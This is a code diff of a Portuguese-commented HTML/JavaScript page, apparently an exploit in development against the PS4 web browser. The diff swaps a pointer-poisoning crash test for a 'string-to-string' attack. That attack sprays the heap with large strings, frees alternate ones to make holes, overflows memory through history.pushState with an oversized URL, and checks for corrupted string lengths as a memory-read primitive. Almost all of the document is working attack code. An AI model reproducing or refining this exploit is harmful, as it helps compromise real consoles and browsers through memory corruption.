@@ -1,91 +1,126 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PS4 Pointer Poisoning Test</title>
+    <title>PS4 String-to-String Attack</title>
     <style>
-        body { background-color: #220000; color: #ff9999; font-family: monospace; padding: 20px; text-align: center; }
+        body { background-color: #050505; color: #0f0; font-family: monospace; padding: 20px; text-align: center; }
         button { 
             font-size: 24px; padding: 20px; margin: 20px; cursor: pointer; 
-            width: 100%; border: 2px solid #ff0000; background: #000; color: #fff; font-weight: bold;
+            width: 100%; border: 2px solid #0f0; background: #000; color: #fff; font-weight: bold;
         }
-        #log { border: 1px solid #555; background: #111; padding: 10px; height: 300px; overflow-y: scroll; text-align: left; }
+        #log { border: 1px solid #333; background: #111; padding: 10px; height: 300px; overflow-y: scroll; text-align: left; color: cyan; }
+        .win { color: #fff; background-color: #008800; padding: 5px; font-size: 20px;}
     </style>
 </head>
 <body>
 
-    <h1>Teste de Veneno (Pointer Poisoning)</h1>
-    <p>Vamos tentar corromper ponteiros de objetos. Se funcionar, o console VAI TRAVAR.</p>
+    <h1>Ataque String-contra-String</h1>
+    <p>Tentando corromper o comprimento de uma String vizinha.</p>
 
-    <button onclick="runPoison()">DISPARAR VENENO</button>
+    <button onclick="runStringExploit()">INICIAR ALINHAMENTO DE STRINGS</button>
     
-    <div id="log">Pronto.</div>
+    <div id="log">Pronto. Reinicie o console para garantir memória limpa.</div>
 
     <script>
         const BASE_OFFSET = 709522;
-        const OVERFLOW_AMT = 1024 * 128; // 128KB de excesso
+        const OVERFLOW_AMT = 1024 * 64; // 64KB de excesso
+
+        // Precisamos de strings que ocupem aproximadamente 1MB ou 2MB na memória
+        // JS Strings usam 2 bytes por caractere (UTF-16) geralmente, ou 1 byte se for Latin-1.
+        // Vamos assumir 1 byte por char para simplificar a conta do "Balde".
+        const STRING_LEN = 1024 * 1024; // 1 Milhão de caracteres (~1MB ou 2MB RAM)
+        const SPRAY_COUNT = 500;
 
         var victims = [];
 
         function log(msg) {
             const el = document.getElementById('log');
-            el.innerHTML += msg + "<br>";
+            el.innerHTML += "<div>" + msg + "</div>";
             el.scrollTop = el.scrollHeight;
         }
 
-        function runPoison() {
-            log("1. Alocando Arrays de Objetos...");
+        function runStringExploit() {
+            log("1. Gerando " + SPRAY_COUNT + " Strings Gigantes (Spray)...");
 
             setTimeout(() => {
                 try {
-                    // SPRAY: Criamos arrays que contêm referências a objetos
-                    // Arrays de Objetos usam memória de forma diferente de Uint32Array
-                    const SPRAY_NUM = 50000;
-                    
-                    for (let i = 0; i < SPRAY_NUM; i++) {
-                        // Um array pequeno com um objeto dentro
-                        // Se corrompermos isso, o ponteiro para o objeto vira lixo
-                        let arr = [{id: i}, {val: 0x41414141}]; 
-                        victims.push(arr);
+                    // Cria uma string base gigante de "B"s
+                    const baseStr = "B".repeat(STRING_LEN);
+
+                    // Aloca muitas cópias
+                    for (let i = 0; i < SPRAY_COUNT; i++) {
+                        // Adicionamos o índice no começo para identificar qual foi atingida
+                        // Ex: "IDX:001 BBBBB..."
+                        let prefix = "IDX:" + i.toString().padStart(3, '0') + " ";
+                        // Fatia para manter o tamanho exato
+                        let finalStr = prefix + baseStr.slice(prefix.length);
+                        victims.push(finalStr);
                     }
 
-                    log("2. Disparando Overflow...");
+                    log("2. Abrindo buracos (Estratégia Queijo Suíço)...");
+                    
+                    // Apaga uma sim, uma não, para criar buracos onde o exploit vai cair
+                    for (let i = 0; i < SPRAY_COUNT; i += 2) {
+                        victims[i] = null; 
+                    }
 
-                    // Dispara
+                    // Força GC
+                    try { new ArrayBuffer(50 * 1024 * 1024); } catch(e){}
+
+                    log("3. Disparando Overflow no Buraco...");
+
                     setTimeout(() => {
+                        // Payload
                         let buffer = "A".repeat(BASE_OFFSET);
+                        // Overflow seguro
                         buffer += "\x01".repeat(OVERFLOW_AMT);
-                        
-                        history.pushState({}, "poison", "/" + buffer);
 
-                        log("3. Verificando integridade (Tocando nos objetos)...");
-                        checkVitality();
+                        history.pushState({}, "str_pwn", "/" + buffer);
 
-                    }, 500);
+                        log("4. Verificando integridade das Strings...");
+                        checkStrings();
+
+                    }, 1000);
 
                 } catch (e) {
-                    log("Erro: " + e.message);
+                    log("Erro (OOM): " + e.message);
                 }
             }, 200);
         }
 
-        function checkVitality() {
-            // Se o overflow funcionou, algum desses acessos vai tentar ler
-            // o endereço de memória 0x01010101 e matar o Kernel.
+        function checkStrings() {
+            let found = false;
             
-            for (let i = 0; i < victims.length; i++) {
+            // Verifica apenas as strings que sobraram (índices ímpares)
+            for (let i = 1; i < victims.length; i += 2) {
                 let v = victims[i];
-                
-                try {
-                    // Tenta acessar uma propriedade do objeto.
-                    // Isso força o navegador a seguir o ponteiro.
-                    let check = v[0].id; 
-                } catch (e) {
-                    // Se der erro JS, ok.
-                    // Se der Crash de sistema, VITÓRIA.
+                if (!v) continue;
+
+                // CHECK 1: O Tamanho mudou?
+                if (v.length !== STRING_LEN) {
+                    log("<span class='win'>!!! SUCESSO (LENGTH) !!!</span>");
+                    log("String #" + i + " mudou de tamanho!");
+                    log("Original: " + STRING_LEN + " | Novo: " + v.length);
+                    found = true;
+                    // Se o tamanho ficou gigante, podemos ler a memória!
+                    break;
+                }
+
+                // CHECK 2: O Conteúdo mudou?
+                // Checa o primeiro caractere e o índice 1000
+                // Deveria ser 'I' (de IDX) ou 'B'. Se for 0x01 (caractere estranho), BINGO.
+                if (v.charCodeAt(0) === 1 || v.charCodeAt(1000) === 1) {
+                    log("<span class='win'>!!! SUCESSO (CONTENT) !!!</span>");
+                    log("String #" + i + " foi corrompida por 0x01!");
+                    found = true;
+                    break;
                 }
             }
-            log("Sobreviveu... Nenhum ponteiro foi atingido.");
-            log("Diagnóstico: Heap Isolation forte ou Spray insuficiente.");
+
+            if (!found) {
+                log("Nenhuma string corrompida.");
+                log("Dica: Tente mudar o STRING_LEN para 512*1024 ou 2*1024*1024.");
+            }
         }
     </script>
 </body>
